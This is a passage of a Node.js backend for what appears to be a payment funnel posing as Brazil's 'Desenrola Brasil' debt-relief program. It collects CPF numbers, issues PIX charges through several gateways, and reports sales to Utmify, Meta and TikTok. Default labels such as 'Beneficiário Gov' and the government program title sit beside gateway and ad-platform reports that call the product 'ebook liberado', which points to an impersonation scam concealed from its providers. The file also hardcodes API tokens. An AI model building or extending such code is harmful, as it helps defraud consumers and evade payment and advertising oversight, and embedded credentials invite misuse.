      code: (t.code || '').trim(),
      token: (t.token || '').trim(),
      active: t.active !== undefined ? Boolean(t.active) : true
    }));
  }
  // Save Utmify API tokens together with pixels in the SAME load/save cycle,
  // instead of as a separate parallel request, so one write can't clobber the
  // other when they land on different serverless instances with different
  // in-memory copies of the data file.
  if (data && Array.isArray(data.utmifyTokens)) {
    const cleanTokens = data.utmifyTokens.map(t => (typeof t === 'string' ? t.trim() : '')).filter(Boolean);
    if (cleanTokens.length > 0) {
      db.config.utmifyApiTokens = cleanTokens;
      db.config.utmifyApiToken = cleanTokens[0];
    }
  }

  saveDB();
  return {
    success: true,
    pixels: db.pixels,
    tokens: db.config.utmifyApiTokens,
    message: 'Todos os pixels foram salvos e aplicados com sucesso!'
  };
}

// ----------------------------------------------------
// OFFERS & PIXELS CRUD
// ----------------------------------------------------
function getOffers() {
  const db = loadDB();
  const list = (db.offers || []).map(o => ({
    id: o.id,
    name: o.name,
    slug: o.slug,
    active: o.active,
    utmifyTokenMasked: maskString(o.utmifyToken, 4, 4),
    pixels: o.pixels || [],
    createdAt: o.createdAt
  }));

  return {
    success: true,
    total: list.length,
    offers: list
  };
}

function saveOffer({ id, name, slug, utmifyToken, active, pixels }) {
  const db = loadDB();
  if (!name || !slug) {
    return { success: false, error: 'Nome e slug são obrigatórios.' };
  }

  const cleanSlug = slug.toLowerCase().replace(/[^a-z0-9-_]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '');
  const duplicate = db.offers.find(o => o.slug === cleanSlug && o.id !== id);
  if (duplicate) {
    return { success: false, error: `O slug /${cleanSlug} já está em uso por outra oferta.` };
  }

  const pixelMap = new Set();
  const cleanPixels = [];
  if (Array.isArray(pixels)) {
    for (const p of pixels) {
      if (!p.pixelId) continue;
      const pid = p.pixelId.trim();
      if (pixelMap.has(pid)) continue;
      pixelMap.add(pid);
      cleanPixels.push({
        id: p.id || 'pix_' + Math.random().toString(36).substr(2, 9),
        platform: p.platform || 'TikTok',
        pixelId: pid,
        label: p.label ? p.label.trim() : ''
      });
    }
  }

  if (active) {
    db.offers.forEach(o => { o.active = false; });
  }

  if (id && id !== 'new') {
    const idx = db.offers.findIndex(o => o.id === id);
    if (idx === -1) return { success: false, error: 'Oferta não encontrada para atualização.' };

    db.offers[idx] = {
      ...db.offers[idx],
      name: name.trim(),
      slug: cleanSlug,
      utmifyToken: (utmifyToken && !utmifyToken.includes('••••')) ? utmifyToken.trim() : db.offers[idx].utmifyToken,
      active: Boolean(active),
      pixels: cleanPixels,
      updatedAt: new Date().toISOString()
    };
  } else {
    const newOffer = {
      id: 'off_' + Date.now(),
      name: name.trim(),
      slug: cleanSlug,
      utmifyToken: utmifyToken ? utmifyToken.trim() : '',
      active: active !== undefined ? Boolean(active) : true,
      pixels: cleanPixels,
      createdAt: new Date().toISOString()
    };
    db.offers.push(newOffer);
  }

  saveDB();
  return { success: true, message: 'Oferta salva com sucesso!' };
}

function deleteOffer(id) {
  const db = loadDB();
  const initialLen = db.offers.length;
  db.offers = db.offers.filter(o => o.id !== id);
  if (db.offers.length === initialLen) {
    return { success: false, error: 'Oferta não encontrada.' };
  }
  saveDB();
  return { success: true, message: 'Oferta excluída com sucesso.' };
}

// ----------------------------------------------------
// ORDERS & METRICS
// ----------------------------------------------------
function getOrders(filters = {}) {
  const db = loadDB();
  let list = [...(db.orders || [])];

  if (filters.status && filters.status !== 'ALL') {
    list = list.filter(o => o.status.toUpperCase() === filters.status.toUpperCase());
  }

  if (filters.search) {
    const q = filters.search.toLowerCase();
    list = list.filter(o => 
      (o.clientName || '').toLowerCase().includes(q) ||
      (o.email || '').toLowerCase().includes(q) ||
      (o.id || '').toLowerCase().includes(q) ||
      (o.transactionId || '').toLowerCase().includes(q)
    );
  }

  list.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

  return {
    success: true,
    total: list.length,
    orders: list
  };
}

function getOrderById(id) {
  const db = loadDB();
  const order = db.orders.find(o => o.id === id || o.transactionId === id);
  if (!order) {
    return { success: false, error: 'Pedido não encontrado.' };
  }
  return { success: true, order: order };
}

function addOrder(orderData) {
  const db = loadDB();
  const newOrder = {
    id: orderData.id || 'ord_' + Date.now(),
    clientName: orderData.clientName || 'Beneficiário Gov',
    email: orderData.email || 'cliente@email.com',
    phone: orderData.phone ? orderData.phone.replace(/\D/g, '') : '',
    cpfMasked: orderData.cpf ? maskString(orderData.cpf.replace(/\D/g, ''), 3, 2) : '080.***.***-88',
    phoneMasked: orderData.phone ? maskString(orderData.phone.replace(/\D/g, ''), 2, 2) : '(11) 9****-****',
    gateway: orderData.gateway || 'FreePay',
    gatewayKey: orderData.gatewayKey || 'freepay',
    amount: Number(orderData.amount) || 68.92,
    status: orderData.status || 'PENDING',
    transactionId: orderData.transactionId || 'tr_' + Date.now(),
    pixKeyMasked: orderData.pixCode ? maskString(orderData.pixCode, 14, 8) : '',
    pixCodeMasked: orderData.pixCode ? maskString(orderData.pixCode, 16, 12) : '',
    pixCopied: false,
    pixCopiedAt: null,
    createdAt: new Date().toISOString(),
    paidAt: orderData.status === 'PAID' ? new Date().toISOString() : null,
    itemTitle: orderData.itemTitle || 'Quitação de Dívidas - Programa Desenrola Brasil'
  };

  db.orders.unshift(newOrder);
  saveDB();
  return newOrder;
}

function updateOrderStatus(transactionIdOrOrderId, newStatus) {
  const db = loadDB();
  const order = db.orders.find(o => o.id === transactionIdOrOrderId || o.transactionId === transactionIdOrOrderId);
  if (order) {
    order.status = newStatus.toUpperCase();
    if (order.status === 'PAID' && !order.paidAt) {
      order.paidAt = new Date().toISOString();
    }
    saveDB();
  }
}

function markPixCopied(transactionIdOrOrderId) {
  const db = loadDB();
  const order = db.orders.find(o => o.id === transactionIdOrOrderId || o.transactionId === transactionIdOrOrderId);
  if (!order) return { success: false, error: 'Pedido não encontrado.' };
  if (!order.pixCopied) {
    order.pixCopied = true;
    order.pixCopiedAt = new Date().toISOString();
    saveDB();
  }
  return { success: true };
}

function ordersToCsv(orders) {
  const esc = (v) => '"' + String(v === null || v === undefined ? '' : v).replace(/"/g, '""') + '"';
  const header = ['Nome', 'Telefone', 'Email', 'CPF (mascarado)', 'Valor', 'Status', 'Pix Copiado', 'Gateway', 'Data'].join(',');
  const rows = orders.map(o => [
    esc(o.clientName),
    esc(o.phone || ''),
    esc(o.email),
    esc(o.cpfMasked),
    esc(o.amount),
    esc(o.status),
    esc(o.pixCopied ? 'Sim' : 'Não'),
    esc(o.gateway),
    esc(o.createdAt)
  ].join(','));
  return [header, ...rows].join('\r\n');
}

function getMetrics() {
  const db = loadDB();
  const totalOrders = (db.orders || []).length;
  const pendingOrders = (db.orders || []).filter(o => o.status === 'PENDING').length;
  const paidOrders = (db.orders || []).filter(o => o.status === 'PAID' || o.status === 'APPROVED');
  const paidCount = paidOrders.length;
  const totalRevenue = paidOrders.reduce((acc, curr) => acc + (Number(curr.amount) || 0), 0);

  const sessions = db.sessions || DEFAULT_SESSIONS;
  const sConsulta = sessions.consulta || 0;
  const sIdentidade = sessions.identidade || 0;
  const sRecebimento = sessions.recebimento || 0;

  const rateIdentidade = sConsulta > 0 ? ((sIdentidade / sConsulta) * 100).toFixed(1) : '0';
  const rateRecebimento = sIdentidade > 0 ? ((sRecebimento / sIdentidade) * 100).toFixed(1) : '0';
  const overallRetention = sConsulta > 0 ? ((sRecebimento / sConsulta) * 100).toFixed(1) : '0';

  return {
    success: true,
    cards: {
      totalOrders: totalOrders,
      pendingOrders: pendingOrders,
      paidOrders: paidCount,
      approvedRevenue: totalRevenue
    },
    retention: {
      overallPercentage: overallRetention,
      recurrentClients: 0,
      repetitionRate: '0%',
      period: 'Últimos 30 dias',
      funnel: [
        {
          stage: 'Consulta',
          description: 'Acesso à pre-lander e digitação de CPF',
          sessions: sConsulta,
          rate: '100%',
          progress: 100,
          color: '#132238'
        },
        {
          stage: 'Identidade',
          description: 'Atendimento interativo e visualização de proposta',
          sessions: sIdentidade,
          rate: rateIdentidade + '%',
          progress: sConsulta > 0 ? Math.round((sIdentidade / sConsulta) * 100) : null,
          color: '#4c8bb4'
        },
        {
          stage: 'Recebimento',
          description: 'Avanço para emissão e quitação de protocolo/upsell',
          sessions: sRecebimento,
          rate: rateRecebimento + '%',
          progress: sConsulta > 0 ? Math.round((sRecebimento / sConsulta) * 100) : null,
          color: '#0ca678'
        }
      ]
    }
  };
}

function recordSessionEvent(eventType) {
  const db = loadDB();
  if (!db.sessions) db.sessions = { consulta: 0, identidade: 0, recebimento: 0 };
  if (eventType === 'consulta') db.sessions.consulta = (db.sessions.consulta || 0) + 1;
  if (eventType === 'identidade') db.sessions.identidade = (db.sessions.identidade || 0) + 1;
  if (eventType === 'recebimento') db.sessions.recebimento = (db.sessions.recebimento || 0) + 1;
  saveDB();
}

// ----------------------------------------------------
// UTMIFY API & WEBHOOKS DISPATCHER (MULTI-TOKEN SUPPORT)
// ----------------------------------------------------
// Real, currently-valid Utmify webhook token. The other token this project used to
// carry ('487lh6GrQqPa4qvYSNBIO4a7tnBxtZNKoYIe') was confirmed invalid directly
// against Utmify's API (API_CREDENTIAL_NOT_FOUND) and must never be reintroduced
// as a fallback/default anywhere - doing so silently breaks webhook delivery.
const DEFAULT_UTMIFY_TOKENS = ['FVCewCTST4jON2YWRwue5Cl0o4xzJETGKsOA'];

function getUtmifyApiTokens() {
  const db = loadDB();
  if (Array.isArray(db.config?.utmifyApiTokens)) {
    return db.config.utmifyApiTokens.filter(Boolean);
  }
  if (db.config?.utmifyApiToken) {
    return [db.config.utmifyApiToken];
  }
  return DEFAULT_UTMIFY_TOKENS.slice();
}

function getUtmifyApiToken() {
  const tokens = getUtmifyApiTokens();
  return tokens[0] || '';
}

function updateUtmifyApiTokens(tokens) {
  const db = loadDB();
  let list = [];
  if (Array.isArray(tokens)) {
    list = tokens.map(t => typeof t === 'string' ? t.trim() : (t?.token || '').trim()).filter(Boolean);
  } else if (typeof tokens === 'string') {
    list = tokens.split(/[,\n]/).map(t => t.trim()).filter(Boolean);
  }
  // Save exactly what was submitted, including an intentionally empty list -
  // never silently force a fallback token back in over the admin's own choice.
  db.config.utmifyApiTokens = list;
  db.config.utmifyApiToken = list[0] || '';
  saveDB();
  return { success: true, tokens: db.config.utmifyApiTokens, message: 'Tokens da API Utmify salvos com sucesso!' };
}

function updateUtmifyApiToken(token) {
  return updateUtmifyApiTokens([token]);
}

function formatUtcDate(dateObj = new Date()) {
  return dateObj.toISOString().replace('T', ' ').substring(0, 19);
}

async function sendUtmifyOrderWebhook({
  orderId,
  status = 'waiting_payment',
  paymentMethod = 'pix',
  amount = 68.92,
  customer = {},
  tracking = {},
  isTest = false
}) {
  const tokens = getUtmifyApiTokens();
  if (!tokens || tokens.length === 0) {
    console.log('[Utmify] Nenhum token configurado, ignorando webhook.');
    return { success: false, error: 'Nenhum token da Utmify configurado' };
  }

  const now = formatUtcDate(new Date());
  const amountCents = Math.round(Number(amount) * 100);

  const cleanDoc = (customer.document || customer.cpf || '').replace(/\D/g, '') || '08072703188';
  const cleanPhone = (customer.phone || customer.telefone || '').replace(/\D/g, '') || '11999999999';
  const cleanEmail = customer.email || (`cliente_` + cleanDoc + `@email.com`);
  const cleanName = customer.name || customer.nome || 'Beneficiário Gov';

  const payload = {
    orderId: String(orderId || ('ORD_' + Date.now())),
    platform: 'RegularizaBrasil',
    paymentMethod: paymentMethod,
    status: status,
    createdAt: customer.createdAt || now,
    approvedDate: status === 'paid' ? now : null,
    refundedAt: status === 'refunded' ? now : null,
    customer: {
      name: cleanName,
      email: cleanEmail,
      phone: cleanPhone,
      document: cleanDoc,
      ip: customer.ip || '127.0.0.1'
    },
    products: [
      {
        id: 'ebook_liberado',
        name: 'ebook liberado',
        planId: 'ebook_liberado_plan',
        planName: 'ebook liberado',
        quantity: 1,
        priceInCents: amountCents
      }
    ],
    trackingParameters: {
      utm_source: tracking.utm_source || null,
      utm_medium: tracking.utm_medium || null,
      utm_campaign: tracking.utm_campaign || null,
      utm_content: tracking.utm_content || null,
      utm_term: tracking.utm_term || null,
      src: tracking.src || null,
      sck: tracking.sck || null
    },
    commission: {
      totalPriceInCents: amountCents,
      gatewayFeeInCents: 0,
      userCommissionInCents: amountCents,
      currency: 'BRL'
    },
    isTest: isTest
  };

  const dispatchPromises = tokens.map(async (tok) => {
    try {
      const res = await fetch('https://api.utmify.com.br/api-credentials/orders', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-api-token': tok
        },
        body: JSON.stringify(payload)
      });
      const resData = await res.json().catch(() => ({}));
      console.log(`[Utmify Webhook] Token ${tok.slice(0, 6)}... | Order ${payload.orderId} | Status: ${status} | HTTP: ${res.status}`);
      return { token: tok, ok: res.ok && resData.OK !== false, status: res.status, data: resData };
    } catch(err) {
      console.error(`[Utmify Webhook Error - Token ${tok.slice(0, 6)}...]:`, err.message);
      return { token: tok, ok: false, error: err.message };
    }
  });

  const results = await Promise.allSettled(dispatchPromises);
  const successful = results.filter(r => r.status === 'fulfilled' && r.value.ok);
  
  return {
    success: successful.length > 0,
    totalDispatched: tokens.length,
    successfulCount: successful.length,
    results: results.map(r => r.value || { ok: false, error: r.reason })
  };
}

async function sendFacebookCapiEvent({ eventName, orderId, amount, customer = {}, tracking = {} }) {
  const db = loadDB();
  const fbPixels = (db.pixels?.facebook || []).filter(fb => fb.active !== false && fb.pixelId && fb.token);
  if (fbPixels.length === 0) return { success: false, reason: 'Nenhum pixel Meta com token CAPI ativo' };

  const cleanDoc = (customer.document || customer.cpf || '').replace(/\D/g, '');
  const cleanPhone = (customer.phone || customer.telefone || '').replace(/\D/g, '');
  const cleanEmail = (customer.email || '').toLowerCase().trim();
  const cleanName = (customer.name || customer.nome || '').trim();
  const amountVal = Number(amount) || 0;

  const userData = {
    client_ip_address: customer.ip || '127.0.0.1',
    client_user_agent: customer.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
  };
  if (cleanEmail) userData.em = [crypto.createHash('sha256').update(cleanEmail).digest('hex')];
  if (cleanPhone) userData.ph = [crypto.createHash('sha256').update('55' + cleanPhone.replace(/^55/, '')).digest('hex')];
  if (cleanDoc) userData.external_id = [crypto.createHash('sha256').update(cleanDoc).digest('hex')];
  if (cleanName) {
    const parts = cleanName.split(' ');
    userData.fn = [crypto.createHash('sha256').update(parts[0].toLowerCase()).digest('hex')];
    if (parts.length > 1) {
      userData.ln = [crypto.createHash('sha256').update(parts[parts.length - 1].toLowerCase()).digest('hex')];
    }
  }

  const payload = {
    data: [
      {
        event_name: eventName,
        event_time: Math.floor(Date.now() / 1000),
        action_source: 'website',
        event_id: String(orderId),
        user_data: userData,
        custom_data: {
          currency: 'BRL',
          value: amountVal,
          content_type: 'product',
          content_name: 'ebook liberado'
        }
      }
    ]
  };

  const promises = fbPixels.map(async (fb) => {
    try {
      const url = `https://graph.facebook.com/v19.0/${fb.pixelId}/events?access_token=${fb.token}`;
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const data = await res.json().catch(() => ({}));
      console.log(`[Meta CAPI] Pixel ${fb.pixelId} | Event: ${eventName} | HTTP: ${res.status}`);
      return { pixelId: fb.pixelId, ok: res.ok, data };
    } catch(err) {
      console.error(`[Meta CAPI Error - Pixel ${fb.pixelId}]:`, err.message);
      return { pixelId: fb.pixelId, ok: false, error: err.message };
    }
  });

  const results = await Promise.allSettled(promises);
  return { success: true, results: results.map(r => r.value || { ok: false, error: r.reason }) };
}

const TIKTOK_EVENT_MAP = {
  InitiateCheckout: 'InitiateCheckout',
  Purchase: 'CompletePayment'
};

async function sendTikTokEventsApi({ eventName, orderId, amount, customer = {}, tracking = {} }) {
  const db = loadDB();
  const ttPixels = (db.pixels?.tiktok || []).filter(tt => tt.active !== false && tt.pixelId && tt.token);
  if (ttPixels.length === 0) return { success: false, reason: 'Nenhum pixel TikTok com token de Events API ativo' };

  const cleanDoc = (customer.document || customer.cpf || '').replace(/\D/g, '');
  const cleanPhone = (customer.phone || customer.telefone || '').replace(/\D/g, '');
  const cleanEmail = (customer.email || '').toLowerCase().trim();
  const amountVal = Number(amount) || 0;
  const ttEventName = TIKTOK_EVENT_MAP[eventName] || eventName;

  const userData = {
    ip: customer.ip || '127.0.0.1',
    user_agent: customer.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
  };
  if (cleanEmail) userData.email = crypto.createHash('sha256').update(cleanEmail).digest('hex');
  if (cleanPhone) userData.phone_number = crypto.createHash('sha256').update('55' + cleanPhone.replace(/^55/, '')).digest('hex');
  if (cleanDoc) userData.external_id = crypto.createHash('sha256').update(cleanDoc).digest('hex');

  const promises = ttPixels.map(async (tt) => {
    const payload = {
      event_source: 'web',
      event_source_id: tt.pixelId,
      data: [
        {
          event: ttEventName,
          event_time: Math.floor(Date.now() / 1000),
          event_id: String(orderId),
          user: userData,
          properties: {
            currency: 'BRL',
            value: amountVal,
            content_type: 'product',
            contents: [{ content_id: 'ebook_liberado', content_name: 'ebook liberado', quantity: 1, price: amountVal }]
          }
        }
      ]
    };

    try {
      const res = await fetch('https://business-api.tiktok.com/open_api/v1.3/event/track/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Access-Token': tt.token
        },
        body: JSON.stringify(payload)
      });
      const data = await res.json().catch(() => ({}));
      const ok = res.ok && data.code === 0;
      console.log(`[TikTok Events API] Pixel ${tt.pixelId} | Event: ${ttEventName} | HTTP: ${res.status}`);
      return { pixelId: tt.pixelId, ok, data };
    } catch(err) {
      console.error(`[TikTok Events API Error - Pixel ${tt.pixelId}]:`, err.message);
      return { pixelId: tt.pixelId, ok: false, error: err.message };
    }
  });

  const results = await Promise.allSettled(promises);
  return { success: true, results: results.map(r => r.value || { ok: false, error: r.reason }) };
}

module.exports = {
  createUniversalTransaction,
  generateQRCodeDataURL,
  getUtmifyApiTokens,
  getUtmifyApiToken,
  updateUtmifyApiTokens,
  updateUtmifyApiToken,
  sendUtmifyOrderWebhook,
  sendFacebookCapiEvent,
  sendTikTokEventsApi,
  getPixels,
  savePixels,
  loginAdmin,
  validateSession,
  logoutAdmin,
  getGatewayConfig,
  updateGatewayConfig,
  testAndActivateGateway,
  createBlackCatTransaction,
  checkBlackCatStatus,
  createFlevoPayTransaction,
  checkFlevoPayStatus,
  createPinguPagTransaction,
  checkPinguPagStatus,
  getOffers,
  saveOffer,
  deleteOffer,
  getOrders,
  getOrderById,
  addOrder,
  updateOrderStatus,
  markPixCopied,
  ordersToCsv,
  getMetrics,
  recordSessionEvent
};


async function createUniversalTransaction({ amount, name, cpf, phone, email, title }) {
  const db = loadDB();
  const activeKey = db.config?.activeGateway || process.env.ACTIVE_GATEWAY || 'flevopay';
  const gw = db.gateways?.[activeKey] || {};

  console.log(`[GATEWAY DISPATCH] Criando transacao real de R$ ${amount} via ${gw.name || activeKey} (Key: ${activeKey})`);

  // 1. PINGUPAG
  if (activeKey === 'pingupag') {
    try {
      const pinguRes = await createPinguPagTransaction({ amount, name, cpf, phone, email, title });
      const txId = String(pinguRes.transaction_id || pinguRes.id || ('PINGU_' + Date.now()));
      const pixCode = pinguRes.qr_code || pinguRes.pix_code || '';
      let qrDataUrl = pinguRes.qr_code_base64 || pinguRes.pixQrCode || '';
      if (qrDataUrl && !qrDataUrl.startsWith('data:image') && !qrDataUrl.startsWith('http')) {
        qrDataUrl = 'data:image/png;base64,' + qrDataUrl;
      }
      if (!qrDataUrl && pixCode) qrDataUrl = await generateQRCodeDataURL(pixCode);
      return {
        success: true,
        gateway: 'PinguPag',
        gatewayKey: 'pingupag',
        transactionId: txId,
        pixCode: pixCode,
        pixQrCode: qrDataUrl
      };
    } catch(err) {
      console.error('Erro na PinguPag:', err.message);
      throw err;
    }
  }

  // 2. FREEPAY
  if (activeKey === 'freepay') {
    try {
      const pub = decodeKeyIfNeeded(gw.publicKey) || process.env.FREEPAY_PUBLIC_KEY || '';
      const sec = decodeKeyIfNeeded(gw.secretKey) || process.env.FREEPAY_SECRET_KEY || '';
      if (!pub || !sec) {
        throw new Error('Chave pública/secreta da FreePay não configurada.');
      }
      const authHeader = Buffer.from(`${pub}:${sec}`).toString('base64');
      const cleanCpf = (cpf || '').replace(/\D/g, '') || '08072703188';
      const cleanPhone = (phone || '').replace(/\D/g, '') || '11987654321';
      const cleanEmail = email || `cliente_${cleanCpf}@email.com`;
      const amountCents = Math.round(Number(amount) * 100);

      const fpRes = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/create`, {
        method: 'POST',
        headers: {
          'Authorization': `Basic ${authHeader}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          amount: amountCents,
          payment_method: 'pix',
          customer: {
            name: name || 'Beneficiário Regulariza',
            email: cleanEmail,
            document: { number: cleanCpf, type: 'cpf' },
            phone: cleanPhone
          },
          items: [{ title: 'ebook liberado', unit_price: amountCents, quantity: 1, tangible: false }],
          metadata: { order_id: 'ORD_FP_' + Date.now(), cpf: cleanCpf },
          pix: { expires_in_days: 1 }
        })
      });

      const fpData = await fpRes.json();
      if (fpData && fpData.success && fpData.data) {
        const item = fpData.data;
        const pixCode = item.pix?.qr_code || '';
        const qrDataUrl = await generateQRCodeDataURL(pixCode);
        return {
          success: true,
          gateway: 'FreePay',
          gatewayKey: 'freepay',
          transactionId: item.id,
          pixCode: pixCode,
          pixQrCode: qrDataUrl
        };
      } else {
        const errMsg = fpData?.message || fpData?.error || 'Falha na resposta da FreePay';
        throw new Error(errMsg);
      }
    } catch(err) {
      console.error('Erro na FreePay:', err.message);
      throw err;
    }
  }

  // 3. BLACKCAT
  if (activeKey === 'blackcat') {
    try {
      const bcRes = await createBlackCatTransaction({ amount, name, cpf, phone, email, title });
      if (bcRes && bcRes.success && bcRes.data) {
        const item = bcRes.data;
        const pixCode = item.paymentData?.copyPaste || item.paymentData?.qrCode || '';
        let qrDataUrl = item.paymentData?.qrCodeBase64 || '';
        if (!qrDataUrl && pixCode) qrDataUrl = await generateQRCodeDataURL(pixCode);
        return {
          success: true,
          gateway: 'BlackCat',
          gatewayKey: 'blackcat',
          transactionId: item.transactionId,
          pixCode: pixCode,
          pixQrCode: qrDataUrl
        };
      } else {
        throw new Error(bcRes?.message || 'Falha ao gerar PIX na BlackCat');
      }
    } catch(err) {
      console.error('Erro na BlackCat:', err.message);
      throw err;
    }
  }

  // 4. FLEVOPAY
  if (activeKey === 'flevopay') {
    try {
      const flevoRes = await createFlevoPayTransaction({ amount, name, cpf, phone, email, title });
      const txId = String(flevoRes.transaction_id || flevoRes.id || ('FLEVO_' + Date.now()));
      const pixCode = flevoRes.qr_code || flevoRes.pix_code || '';
      let qrDataUrl = flevoRes.qr_code_base64 || '';
      if (!qrDataUrl && pixCode) qrDataUrl = await generateQRCodeDataURL(pixCode);
      return {
        success: true,
        gateway: 'FlevoPay',
        gatewayKey: 'flevopay',
        transactionId: txId,
        pixCode: pixCode,
        pixQrCode: qrDataUrl
      };
    } catch(err) {
      console.error('Erro na FlevoPay:', err.message);
      throw err;
    }
  }

  throw new Error(`Gateway "${activeKey}" não configurada ou sem credenciais ativas.`);
}
